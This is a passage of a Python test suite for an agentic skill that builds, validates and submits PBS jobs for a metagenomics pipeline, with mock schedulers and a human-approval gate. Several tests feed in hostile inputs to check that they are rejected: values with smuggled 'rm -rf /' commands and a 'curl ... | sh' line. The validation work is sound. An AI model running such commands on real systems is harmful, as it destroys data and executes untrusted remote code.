#!/usr/bin/env python3
"""Repeatable tests for the agentic-mima skill (standard library only).

Run:  python3 run_tests.py            (skill folder is found next to this folder)
      MIMA_SKILL=/path/to/agentic-mima python3 run_tests.py -v

Covers: command builder and validators, PBS script checks, the submission gate
(including human approval through a real pseudo-terminal), status parsing against a
mock qstat, log scanning, output checks, report checks, and a consistency lint of the
skill itself. No real PBS cluster or container is used: qsub and qstat are mocks, so
a pass here does NOT prove the skill works on your cluster.
"""
import ast
import json
import os
import re
import select
import shutil
import stat
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

HERE = Path(__file__).resolve().parent
SKILL = Path(os.environ.get("MIMA_SKILL", HERE.parent / "agentic-mima"))
SC = SKILL / "scripts"
PY = sys.executable
RANKS = {"class": "classes", "family": "families", "genus": "genuses", "order": "orders", "phylum": "phylums", "species": "species"}


def run(script, *args, env=None, cwd=None, stdin=subprocess.DEVNULL):
    p = subprocess.run([PY, str(SC / script), *map(str, args)], capture_output=True, text=True, env=env, cwd=cwd, stdin=stdin)
    return p.returncode, p.stdout + p.stderr


def write(path, text="x\n"):
    path = Path(path); path.parent.mkdir(parents=True, exist_ok=True); path.write_text(text); return path


QSUB = '''#!/usr/bin/env python3
import os, sys
log, counter = os.environ["MOCK_LOG"], os.environ["MOCK_COUNTER"]
open(log, "a").write(os.getcwd() + " :: " + " ".join(sys.argv[1:]) + "\\n")
script = sys.argv[-1]
if "FAILME" in open(script).read():
    sys.stderr.write("qsub: mock failure\\n"); sys.exit(1)
n = int(open(counter).read()) + 1 if os.path.exists(counter) else 1001
open(counter, "w").write(str(n)); print(f"{n}.pbssrv")
'''
QSTAT = '''#!/usr/bin/env python3
import json, os, sys
if os.environ.get("MOCK_NO_X") and "-x" in sys.argv:
    sys.stderr.write("qstat: illegal option -- x\\n"); sys.exit(2)
ids = [a for a in sys.argv[1:] if not a.startswith("-") and a != "json"]
jobs = json.load(open(os.environ["MOCK_JOBS"]))
print(json.dumps({"timestamp": 1, "pbs_version": "mock", "Jobs": {k: jobs[k] for k in ids if k in jobs}}))
'''


class Cluster:
    """Mock qsub and qstat on PATH plus bookkeeping files."""
    def __init__(self, root):
        self.root = Path(root); self.bin = self.root / "bin"; self.bin.mkdir(parents=True, exist_ok=True)
        for name, body in (("qsub", QSUB), ("qstat", QSTAT)):
            f = self.bin / name; f.write_text(body); f.chmod(f.stat().st_mode | stat.S_IEXEC)
        self.log, self.counter, self.jobs = self.root / "qsub.log", self.root / "counter", self.root / "jobs.json"
        self.jobs.write_text("{}")

    def env(self, **extra):
        return dict(os.environ, PATH=f"{self.bin}:" + os.environ["PATH"], MOCK_LOG=str(self.log),
                    MOCK_COUNTER=str(self.counter), MOCK_JOBS=str(self.jobs), **extra)

    def reset(self):
        for f in (self.log, self.counter):
            if f.exists(): f.unlink()

    def calls(self):
        return self.log.read_text().splitlines() if self.log.exists() else []


def pbs_script(path, name, mem="64GB", bind="/data:/data", body="", header_extra=""):
    text = f"""#!/bin/bash
#PBS -N {name}
#PBS -l ncpus=8
#PBS -l walltime=2:00:00
#PBS -l mem={mem}
#PBS -j oe
{header_extra}set -x
IMAGE_DIR=/opt/mima
export APPTAINER_BIND="{bind}"
{body}"""
    return write(path, text)


def pty_run(argv, answer, env, cwd):
    """Run argv with a pseudo-terminal as stdin/stdout, like a person at a terminal."""
    import pty
    master, slave = pty.openpty()
    p = subprocess.Popen(argv, stdin=slave, stdout=slave, stderr=slave, env=env, cwd=cwd, close_fds=True)
    os.close(slave); buf = b""; sent = False
    while p.poll() is None:
        if select.select([master], [], [], 0.2)[0]:
            try: buf += os.read(master, 4096)
            except OSError: break
            if not sent and b"cancels" in buf:
                os.write(master, answer.encode() + b"\n"); sent = True
    p.wait(timeout=15)
    return p.returncode, buf.decode(errors="replace")


# ---------------------------------------------------------------- builder
class TestBuilder(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = Path(tempfile.mkdtemp())

    @classmethod
    def tearDownClass(cls):
        shutil.rmtree(cls.tmp, ignore_errors=True)

    def build(self, plan, *flags):
        f = write(self.tmp / "plan.json", json.dumps(plan))
        return run("build_command.py", f, *flags)

    def qc(self, **over):
        params = {"-i": "/w/raw", "-o": "/w/out", "-m": "/w/m.csv", "--ref": "/db/g.fna", "--mode": "container", "--pbs-config": "/w/qc.cfg"}
        params.update(over); return {"module": "mima-qc", "params": params}

    def test_valid_qc_command(self):
        rc, out = self.build(self.qc())
        self.assertEqual(rc, 0, out); self.assertIn("apptainer run --app mima-qc $SANDBOX", out); self.assertIn("--mode container", out)

    def test_relative_tilde_and_injection_rejected(self):
        for bad in ("raw", "~/raw", "/w/out; rm -rf /", "/w/a b", "/w/../etc"):
            rc, out = self.build(self.qc(**{"-i": bad}))
            self.assertEqual(rc, 1, f"{bad!r} was accepted:\n{out}")

    def test_unapproved_module_and_unknown_parameter(self):
        self.assertEqual(self.build({"module": "bash", "params": {"-c": "id"}})[0], 1)
        self.assertEqual(self.build(self.qc(**{"--extra": "x"}))[0], 1)

    def test_container_mode_requires_pbs_config(self):
        rc, out = self.build({"module": "mima-qc", "params": {"-i": "/a", "-o": "/b", "-m": "/c.csv", "--ref": "/d.fna", "--mode": "container"}})
        self.assertEqual(rc, 1); self.assertIn("--pbs-config", out)

    def test_enum_and_zero_value(self):
        taxa = {"module": "mima-taxa-profiling", "params": {"-i": "/a", "-o": "/b", "--reference-path": "/c", "--mode": "container", "--pbs-config": "/p.cfg"}}
        taxa["params"]["--read-length"] = 120
        self.assertEqual(self.build(taxa)[0], 1)
        taxa["params"]["--read-length"] = 150; taxa["params"]["--threshold"] = 0
        rc, out = self.build(taxa)
        self.assertEqual(rc, 0, out); self.assertIn("--threshold 0", out, "a threshold of 0 must not be dropped as 'absent'")

    def test_read_length_checked_against_database_files(self):
        """Bracken needs databaseNmers.kmer_distrib; on the shared GTDB database only 50, 100, 150 exist (Gadi, 2026)."""
        for d in ("in", "db"): (self.tmp / d).mkdir(exist_ok=True)
        for n in (50, 100, 150): write(self.tmp / "db" / f"database{n}mers.kmer_distrib")
        write(self.tmp / "p.cfg")
        base = {"-i": str(self.tmp / "in"), "-o": "/b", "--reference-path": str(self.tmp / "db"), "--mode": "container", "--pbs-config": str(self.tmp / "p.cfg")}
        def taxa(**extra): return {"module": "mima-taxa-profiling", "params": dict(base, **extra)}
        rc, out = self.build(taxa(**{"--read-length": 75}), "--check-fs")
        self.assertEqual(rc, 1, out); self.assertIn("database75mers.kmer_distrib", out); self.assertIn("50, 100, 150", out)
        self.assertEqual(self.build(taxa(**{"--read-length": 100}), "--check-fs")[0], 0)
        self.assertEqual(self.build(taxa(), "--check-fs")[0], 0)  # default 150 exists
        (self.tmp / "db" / "database150mers.kmer_distrib").unlink()
        rc, out = self.build(taxa(), "--check-fs")
        self.assertEqual(rc, 1, "the default read length must be checked too"); self.assertIn("database150mers", out)
        write(self.tmp / "db" / "database150mers.kmer_distrib")
        rc, out = self.build(taxa(**{"--read-length": 75}))  # no --check-fs: cannot know
        self.assertEqual(rc, 0, out); self.assertIn("database75mers.kmer_distrib", out, "without --check-fs the user must still be told what to verify")

    def test_project_defaults_and_known_issue_warnings(self):
        taxa = {"module": "mima-taxa-profiling", "params": {"-i": "/a", "-o": "/b", "--reference-path": "/g/data/mp96/REFDB/GTDB_Kraken", "--mode": "container", "--pbs-config": "/p.cfg"}}
        rc, out = self.build(taxa); self.assertEqual(rc, 0, out)
        self.assertIn("project default is 100", out)
        self.assertNotIn("approved database", out, "the approved GTDB path must not be flagged")
        taxa["params"]["--reference-path"] = "/g/data/other/db"
        rc, out = self.build(taxa); self.assertEqual(rc, 0, out); self.assertIn("approved database", out)
        taxa["params"]["--reference-path"] = "/g/data/mp96/REFDB/GTDB_Kraken/"  # trailing slash is the same directory
        self.assertNotIn("approved database", self.build(taxa)[1])
        vis = {"module": "mima-visualisation", "params": {"--feature-table": ["/v/a_relAbund"], "--metadata": "/v/m.tsv", "--study-groups": "lab", "--output-dir": "/v/o"}}
        rc, out = self.build(vis); self.assertEqual(rc, 0, out)
        self.assertIn("alpha", out); self.assertIn("cause unconfirmed", out)

    def test_stage_order_enforced(self):
        taxa = {"module": "mima-taxa-profiling", "params": {"-i": "/a", "-o": "/b", "--reference-path": "/c", "--mode": "container", "--pbs-config": "/p"}}
        rc, out = self.build({"steps": [taxa, self.qc()]})
        self.assertEqual(rc, 1); self.assertIn("must run before", out)

    def test_visualisation_space_separated_and_comma_rejected(self):
        step = {"module": "mima-visualisation", "params": {"--feature-table": ["/v/a_relAbund", "/v/h.tsv"], "--metadata": "/v/m.tsv", "--study-groups": "lab,type", "--output-dir": "/v/o"}}
        rc, out = self.build(step); self.assertEqual(rc, 0, out); self.assertIn("--feature-table /v/a_relAbund /v/h.tsv", out.replace(" \\\n  ", " "))
        step["params"]["--feature-table"] = "/v/a,/v/b"
        self.assertEqual(self.build(step)[0], 1)

    def test_counts_table_is_a_warning(self):
        step = {"module": "mima-visualisation", "params": {"--feature-table": ["/v/bracken_FT_genus_counts"], "--metadata": "/v/m.tsv", "--study-groups": "lab", "--output-dir": "/v/o"}}
        rc, out = self.build(step); self.assertEqual(rc, 0)
        self.assertIn("accepts both", out); self.assertNotIn("container expects", out)

    def test_classifier_comma_joined_with_mkdir(self):
        step = {"module": "mima-classifier-RF", "params": {"-i": ["/r/a.tsv", "/r/b.tsv"], "-m": "/r/m.tsv", "-c": "Gender", "-o": "/r/out"}}
        rc, out = self.build(step); self.assertEqual(rc, 0, out)
        self.assertIn("mkdir -p /r/out", out); self.assertIn("-i /r/a.tsv,/r/b.tsv", out)

    def test_positional_order(self):
        step = {"module": "mima-vis-taxa", "params": {"feature_table": "/v/ft", "metadata": "/v/m.tsv", "group_spec": "lab:A:B:C", "output_dir": "/v/o", "prefix": "LAB", "top_n": 8, "figure_width": 10, "figure_height": 6}}
        rc, out = self.build(step); self.assertEqual(rc, 0, out)
        flat = out.replace(" \\\n  ", " ")
        self.assertIn("/v/ft /v/m.tsv lab:A:B:C /v/o LAB 8 10 6", flat)

    def test_json_output(self):
        rc, out = self.build(self.qc(), "--format", "json")
        self.assertTrue(json.loads(out)["ok"])

    def test_invalid_step_prints_no_command(self):
        rc, out = self.build({"steps": [{"module": "mima-taxa-profiling", "params": {"-i": "/a", "-o": "/b", "--reference-path": "/c", "--mode": "container", "--pbs-config": "/p"}}, self.qc()]}, "--format", "json")
        steps = json.loads(out)["steps"]; self.assertIsNone(steps[0]["command"])


# ---------------------------------------------------------------- input validators
class TestInputValidators(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = Path(tempfile.mkdtemp())

    @classmethod
    def tearDownClass(cls):
        shutil.rmtree(cls.tmp, ignore_errors=True)

    def test_manifest(self):
        good = write(self.tmp / "g.csv", "Sample_ID,FileID_R1,FileID_R2\nS1,S1_1.fq.gz,S1_2.fq.gz\n")
        self.assertEqual(run("validate_manifest.py", good)[0], 0)
        bad = write(self.tmp / "b.csv", "sample_id,FileID_R1,FileID_R2\r\nS1,S1_1.fq.gz,S1_2.fq.gz\r\nS1,S1_2.fq.gz,S1_2.fq.gz\r\n")
        rc, out = run("validate_manifest.py", bad)
        self.assertEqual(rc, 1)
        for needle in ("CRLF", "Header must be exactly", "duplicate Sample_ID"):
            self.assertIn(needle, out)

    def test_manifest_filesystem_check(self):
        m = write(self.tmp / "m.csv", "Sample_ID,FileID_R1,FileID_R2\nS1,S1_1.fq.gz,S1_2.fq.gz\n")
        rc, out = run("validate_manifest.py", m, "--reads-dir", self.tmp / "empty", "--check-fs")
        self.assertEqual(rc, 1); self.assertIn("file not found", out)

    def test_metadata_levels_case_and_tables(self):
        meta = write(self.tmp / "meta.tsv", "Sample_ID\tlab\nS1\tlabA\nS2\tlabA\nS3\tlabB\nS4\tlabB\n")
        ft = write(self.tmp / "bracken_FT_genus_relAbund", "name\tS1\tS2\tS3\tS9\nx\t1\t2\t3\t4\n")
        rc, out = run("validate_metadata.py", meta, "--group-column", "lab", "--groups", "labA", "labB", "--feature-table", ft)
        self.assertEqual(rc, 0, out); self.assertIn("missing", out)
        rc, out = run("validate_metadata.py", meta, "--group-column", "lab", "--groups", "laba")
        self.assertEqual(rc, 1); self.assertIn("Did you mean 'labA'", out)
        rc, out = run("validate_metadata.py", meta, "--group-column", "Lab")
        self.assertEqual(rc, 1); self.assertIn("case-sensitive", out)

    def test_metadata_humann_headers(self):
        """Container models.py:35-42 accepts '# Taxonomy'/name/'# Pathway'/'# Gene' and rejects '# Gene Family' (Gadi, 2026)."""
        meta = write(self.tmp / "m2.tsv", "Sample_ID\tlab\nS1\tA\nS2\tB\n")
        fam = write(self.tmp / "fam.tsv", "# Gene Family\tS1\tS2\nX\t1\t2\n")
        rc, out = run("validate_metadata.py", meta, "--group-column", "lab", "--feature-table", fam)
        self.assertEqual(rc, 1, out); self.assertIn("rejected", out); self.assertIn("# Gene", out)
        for good in ("# Gene", "# Pathway", "# Taxonomy", "name"):
            f = write(self.tmp / "ok.tsv", f"{good}\tS1\tS2\nX\t1\t2\n")
            rc, out = run("validate_metadata.py", meta, "--group-column", "lab", "--feature-table", f)
            self.assertEqual(rc, 0, f"{good!r}: {out}"); self.assertNotIn("rejected", out)
        odd = write(self.tmp / "odd.tsv", "# Something\tS1\tS2\nX\t1\t2\n")
        rc, out = run("validate_metadata.py", meta, "--group-column", "lab", "--feature-table", odd)
        self.assertEqual(rc, 0, out); self.assertIn("WARN", out)

    def test_metadata_numeric_group_columns(self):
        """A continuous numeric column crashed the container at the CCA/RDA step (Gadi, --study-groups Age)."""
        rows = "".join(f"S{i}\t{20 + i * 3}\t{'A' if i % 2 else 'B'}\t{i % 2}\n" for i in range(1, 11))
        meta = write(self.tmp / "num.tsv", "Sample_ID\tAge\tlab\tcode\n" + rows)
        rc, out = run("validate_metadata.py", meta, "--group-column", "Age")
        self.assertEqual(rc, 1, out); self.assertIn("numeric", out)
        rc, out = run("validate_metadata.py", meta, "--group-column", "lab"); self.assertEqual(rc, 0, out)
        rc, out = run("validate_metadata.py", meta, "--group-column", "code")  # 0/1 codes: untested, so a warning
        self.assertEqual(rc, 0, out); self.assertIn("WARN", out); self.assertIn("numeric", out)

    def test_group_size_tiers(self):
        """Exact Wilcoxon: the smallest possible two-sided p is 0.10 at 3 v 3 and 0.029 at 4 v 4."""
        def meta(n):
            rows = "".join(f"A{i}\tA\n" for i in range(n)) + "".join(f"B{i}\tB\n" for i in range(n))
            return write(self.tmp / f"g{n}.tsv", "Sample_ID\tlab\n" + rows)
        rc, out = run("validate_metadata.py", meta(3), "--group-column", "lab"); self.assertEqual(rc, 0, out)
        self.assertIn("descriptive only", out); self.assertIn("p < 0.05", out)
        rc, out = run("validate_metadata.py", meta(5), "--group-column", "lab")
        self.assertIn("exploratory", out); self.assertNotIn("descriptive only", out)
        rc, out = run("validate_metadata.py", meta(8), "--group-column", "lab")
        self.assertNotIn("descriptive only", out); self.assertNotIn("exploratory", out); self.assertIn("10 or more", out)
        rc, out = run("validate_metadata.py", meta(10), "--group-column", "lab")
        self.assertNotIn("WARN", out)

    def test_repeated_subjects_are_out_of_scope(self):
        rows = "".join(f"S{i}\tP{i % 4}\t{'pre' if i < 4 else 'post'}\n" for i in range(8))
        meta = write(self.tmp / "paired.tsv", "Sample_ID\tsubject\ttime\n" + rows)
        rc, out = run("validate_metadata.py", meta, "--group-column", "time", "--subject-column", "subject")
        self.assertEqual(rc, 1, out); self.assertIn("repeated", out); self.assertIn("MaAsLin2", out)
        rc, out = run("validate_metadata.py", meta, "--group-column", "time")  # not declared: detected by name, warned
        self.assertEqual(rc, 0, out); self.assertIn("subject", out); self.assertIn("more than once", out)
        uniq = write(self.tmp / "unique.tsv", "Sample_ID\tsubject\ttime\n" + "".join(f"S{i}\tP{i}\t{'a' if i < 4 else 'b'}\n" for i in range(8)))
        rc, out = run("validate_metadata.py", uniq, "--group-column", "time", "--subject-column", "subject"); self.assertEqual(rc, 0, out)
        rc, out = run("validate_metadata.py", meta, "--group-column", "time", "--subject-column", "nope"); self.assertEqual(rc, 1)

    def test_covariate_imbalance_flagged(self):
        rows = "".join(f"S{i}\t{'case' if i < 6 else 'ctrl'}\t{70 + i % 3 if i < 6 else 40 + i % 3}\t{'M' if i < 5 else 'F'}\n" for i in range(12))
        meta = write(self.tmp / "cov.tsv", "Sample_ID\tgroup\tAge\tSex\n" + rows)
        rc, out = run("validate_metadata.py", meta, "--group-column", "group", "--covariate", "Age", "--covariate", "Sex")
        self.assertEqual(rc, 0, out); self.assertIn("Age", out); self.assertIn("differs between groups", out); self.assertIn("preliminary", out)
        bal = write(self.tmp / "bal.tsv", "Sample_ID\tgroup\tAge\n" + "".join(f"S{i}\t{'a' if i % 2 else 'b'}\t{50 + i % 5}\n" for i in range(12)))
        rc, out = run("validate_metadata.py", bal, "--group-column", "group", "--covariate", "Age")
        self.assertNotIn("differs between groups", out)

    def test_walltime_estimate_for_taxonomy(self):
        cfg = lambda wt, cpu=28, mem="320GB": f"#!/bin/bash\n#PBS -N a\n#PBS -l ncpus={cpu}\n#PBS -l walltime={wt}\n#PBS -l mem={mem}\n#PBS -j oe\nIMAGE_DIR=/opt/m\nexport APPTAINER_BIND=\"/d:/d\"\n"
        rc, out = run("validate_pbs_config.py", write(self.tmp / "w1.cfg", cfg("4:00:00")), "--module", "taxa", "--samples", "10")
        self.assertEqual(rc, 0, out); self.assertIn("WARN", out); self.assertIn("4:20", out)  # 10 x 20 min + 1 h = 4h20
        rc, out = run("validate_pbs_config.py", write(self.tmp / "w2.cfg", cfg("6:00:00")), "--module", "taxa", "--samples", "10")
        self.assertNotIn("WARN", out, out)
        rc, out = run("validate_pbs_config.py", write(self.tmp / "w3.cfg", cfg("6:00:00", cpu=8)), "--module", "taxa", "--samples", "10")
        self.assertIn("ncpus", out)
        rc, out = run("validate_pbs_config.py", write(self.tmp / "w4.cfg", cfg("1:00:00")), "--module", "qc", "--samples", "10")
        self.assertNotIn("20 minutes", out, "the estimate is for taxonomy only")

    def test_read_length_estimate_and_mapping(self):
        import gzip
        def fq(path, length, n=50):
            with gzip.open(path, "wt") as f:
                for i in range(n): f.write(f"@r{i}\n{'A' * length}\n+\n{'I' * length}\n")
        def run_len(lengths):
            d = self.tmp / f"fq{'_'.join(map(str, lengths))}"; d.mkdir(exist_ok=True)
            for i, L in enumerate(lengths): fq(d / f"S{i}_clean_1.fq.gz", L); fq(d / f"S{i}_clean_2.fq.gz", L)
            return run("estimate_read_length.py", d)
        for length, expect in ((150, "150"), (126, "150"), (125, "100"), (100, "100"), (76, "100"), (75, "50"), (50, "50"), (250, "150")):
            rc, out = run_len([length]); self.assertEqual(rc, 0, out)
            self.assertIn(f"--read-length {expect}", out, f"{length} bp -> {out}")
        _, out = run_len([250]); self.assertIn("longest", out)
        _, out = run_len([100, 150, 100, 150]); self.assertIn("one value for the whole cohort", out)
        self.assertEqual(run("estimate_read_length.py", self.tmp / "nothing_here")[0], 2)

    def test_base_bracken_table_note_does_not_claim_container_expects_relabund(self):
        meta = write(self.tmp / "m3.tsv", "Sample_ID\tlab\nS1\tA\nS2\tB\n")
        ft = write(self.tmp / "bracken_FT_genus", "name\tS1\tS2\nX\t1\t2\n")
        rc, out = run("validate_metadata.py", meta, "--group-column", "lab", "--feature-table", ft)
        self.assertEqual(rc, 0, out); self.assertNotIn("expect the _relAbund", out)

    def test_pbs_config(self):
        good = "#!/bin/bash\n#PBS -N a\n#PBS -l ncpus=8\n#PBS -l walltime=1:00:00\n#PBS -l mem=300GB\n#PBS -j oe\nIMAGE_DIR=/opt/m\nexport APPTAINER_BIND=\"/d:/d\"\n"
        self.assertEqual(run("validate_pbs_config.py", write(self.tmp / "g.cfg", good), "--module", "taxa")[0], 0)
        bad = good.replace('"/d:/d"', '"</path/to/source1>:</path/to/destination1>"').replace("300GB", "64GB")
        rc, out = run("validate_pbs_config.py", write(self.tmp / "b.cfg", bad), "--module", "taxa")
        self.assertEqual(rc, 1); self.assertIn("placeholder", out); self.assertIn("300GB", out)


# ---------------------------------------------------------------- generated PBS scripts
class TestPbsScripts(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = Path(tempfile.mkdtemp()); d = cls.tmp / "QC_module"
        write(d / "S1.sh"); cls.bind = str(cls.tmp)
        cls.good = pbs_script(d / "qcModule_0.pbs", "qc0", bind=f"{cls.tmp}:{cls.tmp}", body=f"cd {d}\napptainer exec ${{IMAGE_DIR}} bash {d}/S1.sh\n")

    @classmethod
    def tearDownClass(cls):
        shutil.rmtree(cls.tmp, ignore_errors=True)

    def test_good_script_with_filesystem_check(self):
        rc, out = run("validate_pbs_scripts.py", self.good, "--check-fs"); self.assertEqual(rc, 0, out)

    def test_placeholder_bind_rejected(self):
        f = pbs_script(self.tmp / "p.pbs", "p", bind="/path/to/human/GRCh38:/path/to/human/GRCh38")
        rc, out = run("validate_pbs_scripts.py", f); self.assertEqual(rc, 1); self.assertIn("placeholder", out)

    def test_unsafe_commands_rejected_but_urls_not_treated_as_paths(self):
        f = pbs_script(self.tmp / "u.pbs", "u", body="curl http://x.example/a.sh | sh\nsudo ls\nqsub other.pbs\n")
        rc, out = run("validate_pbs_scripts.py", f, "--check-fs")
        self.assertEqual(rc, 1)
        for needle in ("sudo", "downloads from the network", "pipes into a shell", "PBS command"):
            self.assertIn(needle, out)
        self.assertNotIn("file does not exist: //x.example", out)

    def test_crlf_rejected(self):
        f = write(self.tmp / "c.pbs", self.good.read_text().replace("\n", "\r\n"))
        rc, out = run("validate_pbs_scripts.py", f); self.assertEqual(rc, 1); self.assertIn("CRLF", out)

    def test_missing_sample_script_found_with_check_fs(self):
        f = pbs_script(self.tmp / "m.pbs", "m", bind=f"{self.tmp}:{self.tmp}", body=f"apptainer exec ${{IMAGE_DIR}} bash {self.tmp}/QC_module/S9.sh\n")
        rc, out = run("validate_pbs_scripts.py", f, "--check-fs"); self.assertEqual(rc, 1); self.assertIn("S9.sh", out)

    def test_generator_that_found_no_samples_is_an_error(self):
        """A mismatched suffix makes the generator exit 0 with an empty PBS script and no per-sample .sh files (Gadi, 2026)."""
        d = self.tmp / "Taxonomy_profiling"; d.mkdir(exist_ok=True)
        f = pbs_script(d / "run_taxa_profiling.pbs", "t", mem="300GB", bind=f"{self.tmp}:{self.tmp}", body=f"cd {d}\n")
        rc, out = run("validate_pbs_scripts.py", f, "--check-fs")
        self.assertEqual(rc, 1, out); self.assertIn("no per-sample", out); self.assertIn("suffix", out)
        write(d / "S1.sh"); rc, out = run("validate_pbs_scripts.py", f, "--check-fs"); self.assertEqual(rc, 0, out)
        (d / "S1.sh").unlink()
        rc, out = run("validate_pbs_scripts.py", f); self.assertEqual(rc, 0, "needs --check-fs to look at the filesystem")

    def test_taxa_memory_warning(self):
        d = self.tmp / "Taxonomy_profiling"
        f = pbs_script(d / "run_taxa_profiling.pbs", "t", mem="64GB", bind=f"{self.tmp}:{self.tmp}")
        rc, out = run("validate_pbs_scripts.py", f); self.assertIn("300GB", out)


# ---------------------------------------------------------------- submission gate
class TestSubmit(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = Path(tempfile.mkdtemp()); cls.cl = Cluster(cls.tmp / "cluster")

    @classmethod
    def tearDownClass(cls):
        shutil.rmtree(cls.tmp, ignore_errors=True)

    def setUp(self):
        self.cl.reset(); self.work = Path(tempfile.mkdtemp(dir=self.tmp))
        b = f"{self.work}:{self.work}"
        self.qc0 = pbs_script(self.work / "QC_module/qcModule_0.pbs", "qc0", bind=b)
        self.qc1 = pbs_script(self.work / "QC_module/qcModule_1.pbs", "qc1", bind=b)
        self.ft = pbs_script(self.work / "Function_profiling/featureTables/generate_func_feature_tables.pbs", "ft", bind=b)
        self.rec = self.work / "record.json"
        self.plan = write(self.work / "plan.json", json.dumps({"jobs": [
            {"id": "qc0", "script": str(self.qc0)}, {"id": "qc1", "script": str(self.qc1)},
            {"id": "tables", "script": str(self.ft), "after": ["qc0", "qc1"]}]}))

    def dry(self, plan=None):
        rc, out = run("submit_jobs.py", plan or self.plan, "--record", self.rec, "--no-fs-check", env=self.cl.env())
        tok = next((l.split()[-1] for l in out.splitlines() if l.startswith("Confirmation token")), None)
        return rc, out, tok

    def execute(self, tok, *extra, stdin=subprocess.DEVNULL):
        return run("submit_jobs.py", self.plan, "--execute", "--confirm", tok, "--record", self.rec, "--no-fs-check", *extra, env=self.cl.env(), stdin=stdin)

    def test_dry_run_submits_nothing(self):
        rc, out, tok = self.dry(); self.assertEqual(rc, 0, out); self.assertTrue(tok); self.assertEqual(self.cl.calls(), [])
        self.assertIn("a person runs this in a terminal", out)

    def test_invalid_scripts_block_everything(self):
        bad = pbs_script(self.work / "QC_module/qcModule_9.pbs", "bad", bind="/path/to/x:/path/to/x")
        plan = write(self.work / "bad.json", json.dumps({"jobs": [{"id": "b", "script": str(bad)}]}))
        rc, out, tok = self.dry(plan); self.assertEqual(rc, 1); self.assertIsNone(tok); self.assertIn("NOT READY", out)

    def test_no_terminal_refuses_even_with_valid_token(self):
        _, _, tok = self.dry(); rc, out = self.execute(tok)
        self.assertEqual(rc, 1); self.assertIn("interactive terminal", out); self.assertEqual(self.cl.calls(), [])

    def test_wrong_token_refused_in_every_mode(self):
        self.dry()
        rc, out = self.execute("deadbeef0000", "--approval", "harness"); self.assertEqual(rc, 1); self.assertEqual(self.cl.calls(), [])

    def test_terminal_wrong_answer_cancels(self):
        _, _, tok = self.dry()
        argv = [PY, str(SC / "submit_jobs.py"), str(self.plan), "--execute", "--confirm", tok, "--record", str(self.rec), "--no-fs-check"]
        rc, out = pty_run(argv, "yes", self.cl.env(), self.work)
        self.assertEqual(rc, 1); self.assertIn("Cancelled", out); self.assertEqual(self.cl.calls(), [])

    def test_terminal_correct_answer_submits_with_dependencies(self):
        _, _, tok = self.dry()
        argv = [PY, str(SC / "submit_jobs.py"), str(self.plan), "--execute", "--confirm", tok, "--record", str(self.rec), "--no-fs-check"]
        rc, out = pty_run(argv, "submit 3", self.cl.env(), self.work)
        self.assertEqual(rc, 0, out); calls = self.cl.calls(); self.assertEqual(len(calls), 3)
        self.assertIn("depend=afterok:1001.pbssrv:1002.pbssrv", calls[2])
        self.assertTrue(calls[0].startswith(str(self.work / "QC_module")), "jobs must be submitted from the script's own directory")
        rec = json.loads(self.rec.read_text()); self.assertEqual(rec["approvals"][0]["mode"], "tty")

    def test_harness_mode_records_mode(self):
        _, _, tok = self.dry(); rc, out = self.execute(tok, "--approval", "harness")
        self.assertEqual(rc, 0, out); self.assertEqual(json.loads(self.rec.read_text())["approvals"][0]["mode"], "harness")

    def test_tampered_script_invalidates_token(self):
        _, _, tok = self.dry(); self.qc1.write_text(self.qc1.read_text() + "#PBS -l select=1\n")
        rc, out = self.execute(tok, "--approval", "harness"); self.assertEqual(rc, 1); self.assertIn("REFUSED", out); self.assertEqual(self.cl.calls(), [])

    def test_resubmission_refused(self):
        _, _, tok = self.dry(); self.execute(tok, "--approval", "harness"); rc, out, _ = self.dry()
        self.assertEqual(rc, 1); self.assertIn("already submitted", out)

    def test_failure_stops_dependents_and_keeps_record(self):
        self.qc1.write_text(self.qc1.read_text() + "# FAILME\n"); _, _, tok = self.dry()
        rc, out = self.execute(tok, "--approval", "harness")
        self.assertEqual(rc, 1); self.assertEqual(len(self.cl.calls()), 2, "the dependent job must not be submitted")
        self.assertEqual([j["id"] for j in json.loads(self.rec.read_text())["jobs"]], ["qc0"])

    def test_site_options_validated(self):
        rc, out = run("submit_jobs.py", self.plan, "--project", "x; rm -rf /", "--no-fs-check", env=self.cl.env()); self.assertEqual(rc, 2)
        rc, out = run("submit_jobs.py", self.plan, "--project", "ab12", "--queue", "normal", "--no-fs-check", "--record", self.rec, env=self.cl.env())
        self.assertEqual(rc, 0); self.assertIn("qsub -P ab12 -q normal", out)

    def test_bad_plans(self):
        plan = write(self.work / "p.json", json.dumps({"jobs": [{"id": "a", "script": "rel.pbs"}, {"id": "a", "script": "/nope.pbs"}]}))
        rc, out, _ = self.dry(plan); self.assertEqual(rc, 1); self.assertIn("absolute", out)


# ---------------------------------------------------------------- status
class TestStatus(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = Path(tempfile.mkdtemp()); cls.cl = Cluster(cls.tmp)
        cls.cl.jobs.write_text(json.dumps({
            "1.s": {"Job_Name": "ok", "job_state": "F", "Exit_status": 0, "resources_used": {"walltime": "01:00:00", "mem": "10gb"}, "Resource_List": {"walltime": "02:00:00", "mem": "64gb"}},
            "2.s": {"Job_Name": "killed", "job_state": "F", "Exit_status": 271, "comment": "failed", "resources_used": {"walltime": "00:30:00", "mem": "63gb"}, "Resource_List": {"walltime": "02:00:00", "mem": "64gb"}},
            "3.s": {"Job_Name": "run", "job_state": "R", "Resource_List": {"walltime": "01:00:00", "mem": "8gb"}},
            "4.s": {"Job_Name": "q", "job_state": "Q"}, "5.s": {"Job_Name": "neg", "job_state": "F", "Exit_status": -3}}))

    @classmethod
    def tearDownClass(cls):
        shutil.rmtree(cls.tmp, ignore_errors=True)

    def status(self, *ids, env=None):
        return run("check_job_status.py", "--jobs", *ids, "--format", "json", env=env or self.cl.env())

    def test_statuses_and_exit_codes(self):
        rc, out = self.status("1.s", "2.s", "3.s", "4.s", "5.s", "9.s"); d = json.loads(out)
        self.assertEqual({j["id"]: j["status"] for j in d["jobs"]}, {"1.s": "SUCCEEDED", "2.s": "FAILED", "3.s": "RUNNING", "4.s": "QUEUED", "5.s": "FAILED", "9.s": "UNKNOWN"})
        self.assertEqual(rc, 1); self.assertEqual(d["overall"], "FAILED")

    def test_exit_code_by_overall_state(self):
